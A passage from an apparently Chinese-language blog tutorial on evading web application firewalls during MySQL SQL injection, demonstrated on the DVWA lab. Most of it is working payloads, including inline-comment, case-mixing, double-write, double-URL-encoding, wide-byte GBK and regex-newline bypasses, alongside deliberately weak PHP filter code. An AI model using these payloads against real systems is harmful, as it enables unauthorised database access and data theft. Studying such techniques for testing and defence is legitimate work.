+</h4><p>mysql数据库有这样一个特性：</p>
+<ul>
+<li>
+<p><mark><strong>在where id=1后加上=1，变成where id=1=1，意思是查询结果不变</strong></mark></p>
+</li>
+<li>
+<p><mark><strong>在where id=1后加上=0，变成where id=1=0，意思是查询结果取反</strong></mark></p>
+</li>
+</ul>
+<p>结合substring()，我们就能构造出下面的不带有空格注入：</p>
+<pre tabindex="0"><code>1=(ascii(substring(database(),1,1))=100)
+</code></pre><p><strong>如果数据库名称第一个字符不是d，那么就会是1=0，和正常的输入1的结果是完全不同的</strong></p>
+<p>这个思想和盲注异曲同工，但是你可能也发现了，上面的payload只适用于数字型的注入</p>
+<h4 id="字符型数字型">字符型&amp;数字型
+</h4><p>mysql数据库还有一个特性：</p>
+<ul>
+<li><mark><strong>任何可以计算出结果的语句，都可以用括号包围起来</strong></mark></li>
+</ul>
+<p>如果我们想要在字符型进行空格的括号绕过，可以使用()把and后面的表达式包裹起来（前提是有返回值）</p>
+<p><strong>上文提到的<code>sleep()</code>函数其实是有返回值的，执行成功为1，失败为0，因此可以使用()包裹：</strong></p>
+<pre tabindex="0"><code>1&#39;and(sleep((ascii(substring(database(),1,1))=100)+4))#
+</code></pre><p><strong>而if()函数的返回值则取决于我们写在if里面的函数：</strong></p>
+<pre tabindex="0"><code>1&#39;and(if(length(database())=4,sleep(5),1))#
+</code></pre><p>效果和时间盲注相同，这种方式可以用在字符型，也可以用在数字型</p>
+<p>如果逗号被过滤，一般也要使用括号绕过：<a class="link" href="#%e7%bb%95%e8%bf%87%e5%87%bd%e6%95%b0%e5%8f%82%e6%95%b0%e4%b8%ad%e7%9a%84%e9%80%97%e5%8f%b7" >逗号绕过——绕过函数参数中的逗号
+    
+</a></p>
+<h2 id="2-内联注释绕过">#2 内联注释绕过
+</h2><h3 id="绕过特定屏蔽词">绕过特定屏蔽词
+</h3><p><strong>为了保持和其他数据库的兼容，mysql数据库会执行放在<code>/*!...*/</code>里面的语句</strong></p>
+<p>这样，如果WAF限制了不能使用一些查询语句，我们就可以把它放在<code>/*!...*/</code>里，比如：</p>
+<pre tabindex="0"><code>1&#39; union/*!select*/ 1,2 #
+</code></pre><p><strong>WAF会把它看成&quot;带有奇怪符号的注释&quot;而放行，但是到了mysql环境里，就能被执行：</strong></p>
+<p><img src="http://picture.928330.xyz/typora/image-20250629194535907.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250629194535907"
+	
+	
+></p>
+<p><strong>我们还可以在<code>/*!...*/</code>里面加上版本号：<code>/*!50001...*/</code>，表示数据库是5.00.01及以上版本，该语句才会被执行</strong></p>
+<p>我使用的dvwa的mysql版本是5.5.53，如果使用<code>1' union/*!60001select*/ 1,2 #</code>，就会报版本错：</p>
+<pre tabindex="0"><code>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;1,2 #&#39;&#39; at line 1
+</code></pre><h3 id="干扰waf过滤">干扰WAF过滤
+</h3><p>有的WAF过滤覆盖的范围可能不够大，比如会过滤掉<code>order by</code>，但是如果在中间加上<code>/*!10440*/</code>：</p>
+<pre tabindex="0"><code>1&#39; or 1=1 order/*!10440*/by 1#
+</code></pre><p>这样很可能就能让WAF识别错误，如果一个内联注释不行，就多来几个：</p>
+<pre tabindex="0"><code>1&#39; or 1=1 order/*!77777cz*//*!77777cz*/by 1#
+</code></pre><p>或者干脆使用普通的注释干扰：</p>
+<pre tabindex="0"><code>1&#39; or 1=1 order/*%%!asd%%%%*/by 1#
+</code></pre><h2 id="3-大小写绕过">#3 大小写绕过
+</h2><p>有的WAF只针对小写的（或者大写的）查询语句做了过滤：</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#e06c75">$id</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">$_GET</span>[<span style="color:#98c379">&#39;id&#39;</span>];
+</span></span><span style="display:flex;"><span><span style="color:#c678dd">if</span> (<span style="color:#e06c75">strpos</span>(<span style="color:#e06c75">$id</span>, <span style="color:#98c379">&#39;union&#39;</span>) <span style="color:#56b6c2">!&lt;</span><span style="color:#e06c75">mark</span><span style="color:#56b6c2">&gt;</span> <span style="color:#c678dd">false</span> <span style="color:#56b6c2">||</span> <span style="color:#e06c75">strpos</span>(<span style="color:#e06c75">$id</span>, <span style="color:#98c379">&#39;select&#39;</span>) <span style="color:#56b6c2">!&lt;/</span><span style="color:#e06c75">mark</span><span style="color:#56b6c2">&gt;</span> <span style="color:#c678dd">false</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">die</span>(<span style="color:#98c379">&#39;error&#39;</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">$sql</span> <span style="color:#56b6c2">=</span> <span style="color:#98c379">&#34;SELECT * FROM users WHERE user_id = &#39;&#34;</span> <span style="color:#56b6c2">.</span> <span style="color:#e06c75">$id</span> <span style="color:#56b6c2">.</span> <span style="color:#98c379">&#34;&#39;&#34;</span>;
+</span></span></code></pre></div><p><strong>然而很多sql数据库是不区分大小写的</strong>，我们就可以大小写交错写来绕过：</p>
+<pre tabindex="0"><code>1&#39; uNiOn sElEcT 1,database()#
+</code></pre><h2 id="4-双写绕过">#4 双写绕过
+</h2><p>部分WAF所做的工作只是简单的把不允许出现的查询内容（比如sql语句）替换成空字符串：</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#e06c75">$id_sanitized</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">str_replace</span>(<span style="color:#c678dd">array</span>(<span style="color:#98c379">&#39;union&#39;</span>, <span style="color:#98c379">&#39;select&#39;</span>), <span style="color:#98c379">&#39;&#39;</span>, <span style="color:#e06c75">$_GET</span>[<span style="color:#98c379">&#39;id&#39;</span>]; );
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">$sql</span> <span style="color:#56b6c2">=</span> <span style="color:#98c379">&#34;SELECT * FROM users WHERE user_id = &#39;&#34;</span> <span style="color:#56b6c2">.</span> <span style="color:#e06c75">$id_sanitized</span> <span style="color:#56b6c2">.</span> <span style="color:#98c379">&#34;&#39;&#34;</span>; 
+</span></span></code></pre></div><p>这种过滤方式是很不可靠的，因为就算有危险内容，<strong>简陋过滤之后剩下的部分仍然会进入查询（一次过滤）</strong></p>
+<p>我们就可以通过&quot;双写&quot;，<strong>比如<code>selselectect</code>，替换中间的<code>select</code>为空后，剩下的部分仍然是<code>select</code>：</strong></p>
+<pre tabindex="0"><code>1&#39; uniunionon selselectect 1,2#
+</code></pre><p>过滤器替换后：</p>
+<pre tabindex="0"><code>1&#39; union select 1,2#
+</code></pre><h2 id="5-编码绕过">#5 编码绕过
+</h2><p>如果WAF针对关键词进行了区分大小写的过滤，这时候就不能通过大小写和双写蒙混过关了</p>
+<p><strong>不过根据WAF一次过滤的特点，我们还是利用各种编码构造出payload</strong></p>
+<h3 id="双重url编码绕过">双重URL编码绕过
+</h3><p><strong>因为上传的payload只会url解析一次，我们把部分字符再次进行url编码：</strong></p>
+<pre tabindex="0"><code>1&#39; union se%256cect 1,database()#
+</code></pre><p>WAF部分(<code>%25</code> -&gt; <code>%</code>)看见的内容是：</p>
+<pre tabindex="0"><code>1&#39; union se%6cect 1,database()#
+</code></pre><p>执行部分(<code>%6c</code> -&gt; <code>l</code>)看见的是：</p>
+<pre tabindex="0"><code>1&#39; union select 1,database()#
+</code></pre><p>这就成功传入了目标语句</p>
+<p>附上一张url编码表：</p>
+<p><img src="http://picture.928330.xyz/typora/194720-20200610165300516-237246127.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="URL编码表"
+	
+	
+></p>
+<h3 id="十六进制unicode编码ascii编码绕过">十六进制、Unicode编码、ASCII编码绕过
+</h3><p>其实就是把过滤的字符转换成不同的编码欺骗WAF，比如十六进制：</p>
+<pre tabindex="0"><code>1%ef%bc%87 or 1=1#
+</code></pre><p>部分WAF无法解析%ef%bc%87，放行之后会在执行sql语句的服务器(比如IIS)解析，是全角字符<code>＇</code>：</p>
+<pre tabindex="0"><code>1＇ OR 1=1
+</code></pre><p>当然你也能直接输入全角试试能不能绕过，这里只是举一个例子</p>
+<p>其他方式大同小异，这里不多赘述</p>
+<h2 id="6-等价代替绕过">#6 等价代替绕过
+</h2><p><strong>WAF限制了某一些的符号、语句或者函数，但我们可以设法找到功能一样或相似的来代替</strong></p>
+<h3 id="逻辑符号过滤">逻辑符号过滤
+</h3><h4 id="等号过滤绕过">等号(=)过滤绕过
+</h4><p>在SQL语句里，除了=，还有很多用于比较的运算符：</p>
+<ul>
+<li><strong><code>like</code>：用于匹配字符串，<code>A like B</code>表示B是A</strong></li>
+<li><strong><code>in</code>：用于查找目标是否在对应组中</strong></li>
+<li><strong><code>rlike</code>：只要匹配字符串出现即可，<code>A rlike B</code>表示B在A里面</strong></li>
+<li><strong><code>regexp</code>：和<code>rlike</code>用法一样</strong></li>
+<li><strong><code>between</code>：<code>expr between 下界 and 上界</code>，表示是否<code>expr &gt;= 下界 &amp;&amp; exp &lt;= 上界</code>，上下界可以相等</strong></li>
+</ul>
+<p>如果WAF过滤了=，我们可以使用他们实现相同目的：</p>
+<pre tabindex="0"><code>1&#39; union select 1,group_concat(column_name) from information_schema.columns where table_name = &#39;users&#39;#
+</code></pre><p>使用<code>like</code>匹配：</p>
+<pre tabindex="0"><code>1&#39; union select 1,group_concat(column_name) from information_schema.columns where table_name like &#39;users&#39;#
+</code></pre><p>使用<code>in</code>匹配（<strong>注意in匹配的对象要是一个组</strong>）：</p>
+<pre tabindex="0"><code>1&#39; union select 1,group_concat(column_name) from information_schema.columns where table_name in (&#39;users&#39;)#
+</code></pre><p>使用<code>rlike</code>/<code>regexp</code>匹配：</p>
+<pre tabindex="0"><code>1&#39; union select 1,group_concat(column_name) from information_schema.columns where table_name rlike &#39;users&#39;#
+</code></pre><p>使用between判断：</p>
+<pre tabindex="0"><code>1&#39; union select 1,group_concat(column_name) from information_schema.columns where table_name between &#39;users&#39; and &#39;users&#39;#
+</code></pre><h4 id="大于号和小于号过滤绕过">大于号(&gt;)和小于号(&lt;)过滤绕过
+</h4><p>使用盲注的时候，在使用二分查找的时候需要使用到比较操作符来进行查找</p>
+<p>如果无法使用比较操作符，那么就需要使用到greatest()和least()来进行绕过了</p>
+<p><mark><strong>greatest(n1,n2,n3,&hellip;)函数返回输入参数(n1,n2,n3,&hellip;)的最大值，least()则是返回最小值：</strong></mark></p>
+<pre tabindex="0"><code>1&#39; and greatest(ascii(substr(database(),0,1)),64)=64
+</code></pre><p>等价于：</p>
+<pre tabindex="0"><code>1&#39; and ascii(substr(database(),0,1))&gt;64
+</code></pre><h4 id="and和or过滤绕过">and和or过滤绕过
+</h4><div class="table-wrapper"><table>
+  <thead>
+      <tr>
+          <th>符号</th>
+          <th>等价符号</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>and</td>
+          <td>&amp;&amp;</td>
+      </tr>
+      <tr>
+          <td>or</td>
+          <td>||</td>
+      </tr>
+      <tr>
+          <td>xor</td>
+          <td>|</td>
+      </tr>
+      <tr>
+          <td>not</td>
+          <td>!</td>
+      </tr>
+  </tbody>
+</table></div>
+<h3 id="注释符号过滤">注释符号过滤
+</h3><p><strong>如果WAF过滤了<code>#</code>和<code>-- </code> ，我们可以使用另一个<code>'</code>闭合后面的<code>'</code>：</strong></p>
+<pre tabindex="0"><code>1&#39; union select 1,2 or &#39;1
+</code></pre><p>或者</p>
+<pre tabindex="0"><code>1&#39; union select 1,&#39;2
+</code></pre><h3 id="逗号过滤">逗号过滤
+</h3><h4 id="绕过limit中的逗号">绕过limit中的逗号
+</h4><p>在进行盲注时，我们经常需要逐行读取数据，会用到<code>limit m, n</code></p>
+<p><mark><strong>可以使用limit m offset n代替，表示取m行，跳过n行：</strong></mark></p>
+<pre tabindex="0"><code>1&#39; union select 1,database() limit 1 offset 0 #
+</code></pre><p>等价于</p>
+<pre tabindex="0"><code>1&#39; union select 1,database() limit 0,1 #
+</code></pre><h4 id="绕过函数参数中的逗号">绕过函数参数中的逗号
+</h4><p>很多函数需要多个参数，用逗号隔开，例如<code>substring(string, m, n)</code></p>
+<p><mark><strong>可以使用substring(stringfrom m for n)代替：</strong></mark></p>
+<pre tabindex="0"><code>1&#39; and substring(database()from 1 for 1)=&#39;d&#39; #
+</code></pre><p><strong>如果空格被过滤了，可以使用()包裹from和for后面的数字：</strong></p>
+<pre tabindex="0"><code>1&#39; and substring(database()from(1)for(1))=&#39;d&#39; #
+</code></pre><h4 id="绕过select列表中的逗号">绕过select列表中的逗号
+</h4><p>union联合查询注入时，我们经常需要一次性查询多个列，如<code>union select user, password</code></p>
+<p><mark><strong>可以使用join语句代替：</strong></mark></p>
+<pre tabindex="0"><code>1&#39; union select * from (select database())a join (select version())b#
+</code></pre><p>这段语句是如何工作的？我们逐一拆解：</p>
+<p><strong><code>(select database())a</code></strong>: 创建了一个只含一列（数据库名）的临时表，并别名为 <code>a</code></p>
+<p><strong><code>(select version())b</code></strong>: 创建了另一个只含一列（版本信息）的临时表，并别名为 <code>b</code></p>
+<p><strong><code>... a join b</code></strong>: 通过<code>join</code>将这两个只有一行一列的表连接起来，形成一个一行两列的新表</p>
+<p><strong><code>select * from...</code></strong>: 最后用 <code>select *</code> 将这个新表的所有列（即我们想要的数据库名和版本信息）查询出来</p>
+<p><strong>当然，select后面的内容可以改成你想要的内容，select的数量也根据字段数确定，多join几次就行</strong></p>
+<h3 id="函数过滤">函数过滤
+</h3><h4 id="常见函数过滤">常见函数过滤
+</h4><p>下面是一些常见的等价函数：</p>
+<div class="table-wrapper"><table>
+  <thead>
+      <tr>
+          <th style="text-align: left">常用函数</th>
+          <th style="text-align: left">等价函数或语法</th>
+          <th style="text-align: left">功能</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td style="text-align: left"><strong><code>substring(str, m, n)</code></strong></td>
+          <td style="text-align: left"><code>substr(str, m, n)</code><br><code>mid(str, m, n)</code><br /><code>reverse+left</code></td>
+          <td style="text-align: left">截取字符串</td>
+      </tr>
+      <tr>
+          <td style="text-align: left"><strong><code>ascii(char)</code></strong></td>
+          <td style="text-align: left"><code>ord(char)</code></td>
+          <td style="text-align: left">返回字符的ASCII码</td>
+      </tr>
+      <tr>
+          <td style="text-align: left"><strong><code>if(exp1, exp2, exp3)</code></strong></td>
+          <td style="text-align: left"><code>case when exp1 then exp2 else exp3 end</code></td>
+          <td style="text-align: left">条件判断语句</td>
+      </tr>
+      <tr>
+          <td style="text-align: left"><strong><code>database()</code></strong></td>
+          <td style="text-align: left"><code>schema()</code></td>
+          <td style="text-align: left">返回当前数据库名</td>
+      </tr>
+      <tr>
+          <td style="text-align: left"><strong><code>user()</code></strong></td>
+          <td style="text-align: left"><code>current_user()</code><br><code>session_user()</code><br><code>system_user()</code><br /><code>@@user</code></td>
+          <td style="text-align: left">返回当前数据库用户</td>
+      </tr>
+      <tr>
+          <td style="text-align: left"><strong><code>version()</code></strong></td>
+          <td style="text-align: left"><code>@@version</code></td>
+          <td style="text-align: left">返回数据库版本信息</td>
+      </tr>
+      <tr>
+          <td style="text-align: left"><strong><code>concat(s1, s2, ...)</code></strong></td>
+          <td style="text-align: left"><code>concat_ws(sep, s1, s2, ...)</code><br><code>group_concat(name)</code></td>
+          <td style="text-align: left">拼接字符串</td>
+      </tr>
+      <tr>
+          <td style="text-align: left"><strong><code>hex(str)</code></strong></td>
+          <td style="text-align: left"><code>0x...</code> (十六进制字面量)</td>
+          <td style="text-align: left">将字符串转换为十六进制</td>
+      </tr>
+      <tr>
+          <td style="text-align: left"><strong><code>sleep(seconds)</code></strong></td>
+          <td style="text-align: left"><code>benchmark(count, exp)</code></td>
+          <td style="text-align: left">造成时间延迟</td>
+      </tr>
+      <tr>
+          <td style="text-align: left"><strong><code>datadir()</code></strong></td>
+          <td style="text-align: left"><code>@@datadir</code></td>
+          <td style="text-align: left">返回数据库路径</td>
+      </tr>
+  </tbody>
+</table></div>
+<p>大部分相信都很熟悉了，这里介绍个几个比较不常见的：</p>
+<h4 id="case-when语句代替if">case when语句代替if
+</h4><p><mark><strong>用法一：</strong></mark> <strong><code>case when exp1 then exp2 else exp3 end</code></strong></p>
+<p><strong>如果exp1为真就返回exp2，反之返回exp3</strong></p>
+<pre tabindex="0"><code>1&#39; and (case when ascii(substring(database(),1,1))=100 then sleep(5) else 1 end)#
+</code></pre><p><mark><strong>用法二：</strong></mark> <strong><code>case x when y then exp2 else exp3 end</code></strong></p>
+<p><strong>如果x=y则返回exp2，反之返回exp3</strong></p>
+<pre tabindex="0"><code>1&#39; and(case ascii(substring(database(),1,1)) when 100 then sleep(5) else 1 end)#
+</code></pre><h4 id="reverseleft代替substring">reverse+left代替substring
+</h4><p><code>left</code>函数不能截取某一个精确的字符，但是结合<code>reverse</code>和<code>ascii</code>函数可以做到<code>substring+ascii</code>一样的效果：</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#e06c75">ascii</span>(<span style="color:#e06c75">reverse</span>(<span style="color:#e06c75">left</span>(<span style="color:#e06c75">string</span>, <span style="color:#e06c75">n</span>)))
+</span></span></code></pre></div><p><strong>这个组合可以做到取出string字符串第n位的ascii码</strong></p>
+<p>怎么工作的呢？我们以<code>ascii(reverse(left('ABCDE', 3)))</code>为例：</p>
+<ul>
+<li>
+<p><strong><code>left('ABCDE', 3)</code></strong></p>
+<p>首先，<code>left()</code>函数从左边截取前3个字符，得到结果 <code>'ABC'</code></p>
+</li>
+<li>
+<p><strong><code>reverse('ABC')</code></strong></p>
+<p>接着，<code>reverse()</code>函数将上一步的结果<code>'ABC'</code>进行反转，得到<code>'CBA'</code></p>
+</li>
+<li>
+<p><strong><code>ascii('CBA')</code></strong></p>
+<p>这是最关键的一步，<code>ascii()</code>函数会返回其参数字符串的<strong>第一个字符</strong>的ASCII码</p>
+<p>在这里，字符串<code>'CBA'</code>的第一个字符是<code>'C'</code>，其ASCII码是<code>67</code></p>
+</li>
+</ul>
+<h4 id="trim代替substring">trim代替substring
+</h4><p>trim()函数在SQL中主要用于移除字符串首尾的字符</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#e06c75">trim</span>(<span style="color:#e06c75">both</span><span style="color:#56b6c2">|</span><span style="color:#e06c75">leading</span><span style="color:#56b6c2">|</span><span style="color:#e06c75">trailing</span> <span style="color:#e06c75">remstr</span> <span style="color:#e06c75">from</span> <span style="color:#e06c75">str</span>)
+</span></span></code></pre></div><ul>
+<li>
+<p><strong><code>str</code></strong>: 要处理的源字符串</p>
+</li>
+<li>
+<p><strong><code>remstr</code></strong>: 要从<code>str</code>中移除的子字符串</p>
+</li>
+<li>
+<p><strong><code>both|leading|trailing</code></strong>: 指定移除的位置</p>
+<ul>
+<li>
+<p><code>leading</code>: 只从<strong>开头</strong>移除</p>
+</li>
+<li>
+<p><code>trailing</code>: 只从<strong>结尾</strong>移除</p>
+</li>
+<li>
+<p><code>both</code>: 从<strong>开头和结尾两端</strong>移除（默认）</p>
+</li>
+</ul>
+</li>
+</ul>
+<p><strong><mark>但如果我们让它移除一个不存在的字符，他什么都不会做：</mark></strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#e06c75">trim</span>(<span style="color:#e06c75">leading</span> <span style="color:#98c379">&#39;e&#39;</span> <span style="color:#e06c75">from</span> <span style="color:#98c379">&#39;abcd&#39;</span>)
+</span></span></code></pre></div><p><strong>返回的结果仍然是abcd，因为abcd的开头不是e</strong></p>
+<p><strong>利用这一点，我们就可以不直接比较字符是否相等，而是通过比较两次<code>trim()</code>操作的结果是否相同，来推断一个字符是否是目标字符串的开头</strong></p>
+<p><strong>第一次<code>trim()</code>：</strong></p>
+<pre tabindex="0"><code>(trim(leading &#39;a&#39; from database()) = (trim(leading &#39;b&#39; from database()))
+</code></pre><p>前者返回 <code>'dvwa'</code> （开头不是&rsquo;a&rsquo;）,后者返回 <code>'dvwa'</code> （开头也不是&rsquo;b&rsquo;）最终 <code>'dvwa' = 'dvwa'</code>，表达式为真</p>
+<p>这样的话，我们就能判断数据库名称不是以a或者b开头，跳过这两个字母，继续往下尝试</p>
+<p><strong>第二次<code>trim()</code>：</strong></p>
+<pre tabindex="0"><code>(trim(leading &#39;c&#39; from database()) = (trim(leading &#39;d&#39; from database()))
+</code></pre><p>前者返回 <code>'dvwa'</code> （开头不是&rsquo;c&rsquo;）,后者返回 <code>'vwa'</code> （开头是&rsquo;d&rsquo;）最终 <code>'dvwa' = 'vwa'</code>，表达式为假</p>
+<p>我们就能够判断，数据库名称是以c和d其中的一个字母开头，取其中一个字母，继续往下尝试</p>
+<p><strong>第三次<code>trim()</code>：</strong></p>
+<pre tabindex="0"><code>(trim(leading &#39;d&#39; from database()) = (trim(leading &#39;e&#39; from database()))
+</code></pre><p>表达式为<code>'vwa' = 'dvwa'</code>，表达式为假，我们就可以确定，数据库名称是以d和e其中的一个字母开头</p>
+<p>再结合上一次的判断结果，c和d中有一个是开头字母，就能确定是以d开头了</p>
+<p>如果这个表达式为假，说明d和e都不是，而c和d中有一个是，我们同样能以此确定是以c开头</p>
+<p>这样一位一位判断，就能凑出全貌</p>
+<h2 id="7-宽字节绕过">#7 宽字节绕过
+</h2><h3 id="注入原理">注入原理
+</h3><p>宽字节注入是一种专门针对Web应用程序与数据库之间<strong>字符集编码不一致</strong>而产生的SQL注入漏洞</p>
+<p>其核心原理是PHP转义函数的单字节和MySQL数据库（当使用GBK等宽字节编码时）的多字节之间的矛盾</p>
+<p><strong>Web应用层（如PHP）</strong>：WAF在工作时，并不关心字符的实际编码 。它只是简单地将它认为是危险的单字节字符（如单引号<code>'</code>，其十六进制为<code>0x27</code>），并前面加上一个反斜杠<code>\</code>进行转义（十六进制为<code>0x5c</code>），让这个危险的字符失去原本的功能，被当成普通的字符进行查询</p>
+<p><strong>数据库层（如MySQL）</strong>：当数据库连接的字符集被设置为GBK这类宽字节编码时，它会尝试将两个连续的字节解析为一个汉字或其他宽字符</p>
+<p>在GBK编码中，一个宽字节的第一个字节的范围是<code>0x81-0xFE</code> 。当MySQL遇到这个范围内的字节时，它会认为这是一个宽字符的开始，并把紧随其后的下一个字节也一并“吃掉”，作为该字符的第二部分</p>
+<p><strong>攻击者正是利用了MySQL的这个特性，构造一个第一个字节在<code>0x81-0xFE</code>范围内、而第二个字节恰好是<code>0x5c</code>（即反斜杠<code>\</code>）的字符，让MySQL把PHP辛苦加上去的反斜杠当作普通字符“吃掉”，从而使单引号<code>'</code>重新变有效，导致注入成功</strong></p>
+<h3 id="注入过程">注入过程
+</h3><div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#e06c75">mysql_query</span>(<span style="color:#98c379">&#34;SET NAMES gbk&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">$id</span><span style="color:#56b6c2">=</span><span style="color:#e06c75">check_addslashes</span>(<span style="color:#e06c75">$_GET</span>[<span style="color:#98c379">&#39;id&#39;</span>]);
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">$sql</span><span style="color:#56b6c2">=</span><span style="color:#98c379">&#34;SELECT * FROM users WHERE id=&#39;</span><span style="color:#98c379">$id</span><span style="color:#98c379">&#39; LIMIT 0,1&#34;</span>;
+</span></span></code></pre></div><p>这段代码的关键点在于，它<strong>使用<code>SET NAMES gbk</code>将数据库连接设置为GBK编码</strong>，同时<strong>又使用了自定义的<code>check_addslashes</code>函数对输入进行转义</strong></p>
+<ul>
+<li>
+<p><mark><strong>普通注入(1&rsquo;#)：</strong></mark></p>
+<p>攻击者提交<code>?id=1'#</code>，<code>check_addslashes</code>函数将<code>'</code>转义为<code>\'</code> ，mysql最后执行的语句是：</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#c678dd">SELECT</span> <span style="color:#56b6c2">*</span> <span style="color:#c678dd">FROM</span> <span style="color:#e06c75">users</span> <span style="color:#c678dd">WHERE</span> <span style="color:#e06c75">id</span><span style="color:#56b6c2">=</span><span style="color:#98c379">&#39;1\&#39;</span><span style="color:#56b6c2">#</span><span style="color:#98c379">&#39;
+</span></span></span></code></pre></div><p>这里的转义后的<code>'</code>变成了普通的符号，无法闭合字符串</p>
+</li>
+<li>
+<p><mark><strong>宽字节注入(1%df&rsquo;#)：</strong></mark></p>
+<p>攻击者提交<code>?id=1%df'#</code>，<code>check_addslashes</code>函数将<code>'</code>转义为<code>\'</code>，在url编码下变成：</p>
+<pre tabindex="0"><code>?id=1%df%5c%27#
+</code></pre><p><code>%5c</code>就是被添加进去的反斜杠<code>\</code></p>
+<p>请求到达MySQL服务器，由于连接是GBK编码，MySQL开始按照GBK规则解析字节流<code>0xdf 0x5c 0x27</code>：</p>
+<p><strong>MySQL首先读到<code>0xdf</code>，因为它在<code>0x81-0xFE</code>范围内，MySQL认为这是一个宽字符的开始</strong></p>
+<p><strong>随后，MySQL“吃掉”了紧随其后的<code>0x5c</code>（反斜杠<code>\</code>）作为这个宽字符的第二字节</strong></p>
+<p><strong><code>0xdf5c</code>被组合成了一个宽字符（在GBK中为“運”），此时，用于转义的反斜杠<code>\</code>已经被消耗掉了</strong></p>
+<p>MySQL继续向后解析，遇到了<code>0x27</code>（单引号<code>'</code>）这个单引号前面已经没有了反斜杠，它变成了一个有效的SQL语法符号</p>
+<p>最终，MySQL实际执行的语句变成了：</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#c678dd">SELECT</span> <span style="color:#56b6c2">*</span> <span style="color:#c678dd">FROM</span> <span style="color:#e06c75">users</span> <span style="color:#c678dd">WHERE</span> <span style="color:#e06c75">id</span><span style="color:#56b6c2">=</span><span style="color:#98c379">&#39;1運&#39;&#39; #
+</span></span></span></code></pre></div></li>
+</ul>
+<h2 id="8-正则表达式绕过">#8 正则表达式绕过
+</h2><p>众所周知，正则表达式里有很多的修正符，只有设置适当，才能过滤到目标的字符串</p>
+<p>有些粗心的WAF没有设置好修正符，这就让我们有机可乘：</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#e06c75">$id</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">$_GET</span>[<span style="color:#98c379">&#39;id&#39;</span>];
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">$pattern</span> <span style="color:#56b6c2">=</span> <span style="color:#98c379">&#39;/select.*from/i&#39;</span>; 
+</span></span><span style="display:flex;"><span><span style="color:#c678dd">if</span> (<span style="color:#e06c75">preg_match</span>(<span style="color:#e06c75">$pattern</span>, <span style="color:#e06c75">$id</span>)) {
+</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">die</span>(<span style="color:#98c379">&#39;检测到攻击，脚本终止！(Attack Detected!)&#39;</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">$sql</span> <span style="color:#56b6c2">=</span> <span style="color:#98c379">&#34;SELECT * FROM users WHERE user_id = &#39;&#34;</span> <span style="color:#56b6c2">.</span> <span style="color:#e06c75">$id</span> <span style="color:#56b6c2">.</span> <span style="color:#98c379">&#34;&#39;&#34;</span>;
+</span></span></code></pre></div><p>在这里的过滤中，WAF使用了<code>i</code>修正符匹配正则<code>select.*from</code>，意味着大小写绕过无效</p>
+<p>然而，他忘记了使用<code>s</code>修正符！</p>
+<p>元字符<code>.</code>可以匹配除换行符以外的任意单个字符，没有使用<code>s</code>修正符，所以 <code>.</code> 无法匹配换行符！</p>
+<p>而对于MySQL来说，换行符和空格、制表符一样，都是合法的空白分隔符</p>
+<p>所以，我们可以在查询语句里面插入换行符绕过：</p>
+<pre tabindex="0"><code>1&#39; union select 1,table_name%0afrom information_schema.tables where table_schema=&#39;dvwa&#39; #
+												 ↑
+</code></pre><h2 id="9-多参数请求拼凑">#9 多参数请求拼凑
+</h2><p>部分表单（比如登录界面）是通过拼凑用户输入的内容来进行查询的，比如：</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#e06c75">$param_a</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">$_GET</span>[<span style="color:#98c379">&#39;a&#39;</span>];
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">$param_b</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">$_GET</span>[<span style="color:#98c379">&#39;b&#39;</span>];
